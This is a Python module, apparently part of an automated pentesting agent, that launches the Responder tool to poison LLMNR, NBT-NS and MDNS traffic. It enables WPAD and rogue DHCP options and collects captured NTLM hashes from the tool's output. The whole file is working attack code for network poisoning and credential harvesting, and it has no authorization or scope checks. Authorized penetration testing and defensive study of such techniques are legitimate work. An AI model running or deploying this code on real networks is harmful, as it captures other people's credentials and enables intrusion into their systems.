"""
Responder LLMNR/NBT-NS poisoning integration for the Dynamic Analysis Agent.

Responder is a LLMNR, NBT-NS and MDNS poisoner. It will answer to specific
NBT-NS (NetBIOS Name Service) queries based on their name suffix.

This integration performs network poisoning attacks including:
- LLMNR poisoning for NTLM hash capture
- NBT-NS poisoning for legacy Windows hash capture
- MDNS poisoning for Apple device discovery
- WPAD proxy detection
- Rogue DHCP server capabilities

Used for:
- Capturing NTLM hashes from Windows systems
- Network reconnaissance and poisoning
- Credential harvesting during active testing
- Identifying vulnerable LLMNR/NBT-NS configurations
"""

import subprocess
import threading
import time
import signal
import os

def perform_responder_poisoning(interface=None, duration=60):
    """
    Perform Responder poisoning attack for hash capture.

    Args:
        interface (str): Network interface to use
        duration (int): Duration to run poisoning in seconds

    Returns:
        dict: Poisoning results
    """
    try:
        print(f"\nRunning Responder poisoning on interface {interface or 'default'} for {duration}s...")

        # Build command
        cmd = ['responder', '-I', interface] if interface else ['responder']

        # Add options for hash capture
        cmd.extend(['-w', '-r', '-f'])  # WPAD, DHCP, fingerprinting

        print(f"Running command: {' '.join(cmd)}")

        # Start Responder in background
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )

        # Monitor output for captured hashes
        captured_hashes = []
        start_time = time.time()

        while time.time() - start_time < duration:
            if process.poll() is not None:
                break

            # Read stdout
            output = process.stdout.readline()
            if output:
                print(f"Responder: {output.strip()}")
                # Look for hash capture indicators
                if '[*]' in output and ('hash' in output.lower() or 'ntlm' in output.lower()):
                    captured_hashes.append({
                        'timestamp': time.time(),
                        'output': output.strip()
                    })

            time.sleep(0.1)

        # Stop the process
        try:
            if hasattr(os, 'killpg'):
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            else:
                process.terminate()
            process.wait(timeout=10)
        except:
            process.kill()

        print("Responder poisoning completed.")

        return {
            "output": "Responder session completed",
            "captured_hashes": captured_hashes,
            "hash_count": len(captured_hashes),
            "interface": interface,
            "duration": duration,
            "success": True,
            "timestamp": time.time()
        }

    except FileNotFoundError:
        print("Responder not installed. Skipping LLMNR/NBT-NS poisoning.")
        return None
    except Exception as e:
        print(f"Error during Responder poisoning: {e}")
        return {
            "error": str(e),
            "interface": interface,
            "success": False,
            "timestamp": time.time()
        }
